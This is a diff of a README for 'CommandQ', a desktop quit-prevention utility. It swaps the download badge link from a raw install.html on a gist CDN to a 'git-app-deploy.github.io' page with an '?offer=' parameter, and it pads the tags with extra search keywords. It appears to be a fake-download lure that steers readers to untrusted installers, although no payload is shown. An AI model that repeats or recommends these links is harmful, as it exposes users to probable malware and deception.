@@ -1,6 +1,6 @@
 # CommandQ Download — Desktop Quit Control
 
-[![Get CommandQ GitHub](https://img.shields.io/badge/Get%20CommandQ%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/monksley1985/1ae41e63122ada2ae280a5fc8a0e78af/raw/524567224cc7be05b37e2a6f4c7346e931fd1701/install.html?offer=CommandQ)
+[![Get CommandQ GitHub](https://img.shields.io/badge/Get%20CommandQ%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CommandQ)
 
 ---
 
@@ -69,7 +69,7 @@ A: Resource consumption is minimal and optimized for desktop use.
 ---
 
 ## 🔍 Tags
-commandq, desktop quit prevention, accidental exit blocker, productivity utility pc mac, app closure control, commandq pc, commandq windows, commandq desktop, commandq for mac, commandq for pc, commandq for windows, commandq mac
+commandq, grep q, command q, desktop quit prevention, accidental exit blocker, productivity utility pc mac, app closure control, commandq pc, commandq windows, commandq desktop, commandq for mac, commandq for pc, commandq for windows, commandq mac
 
 ---
 
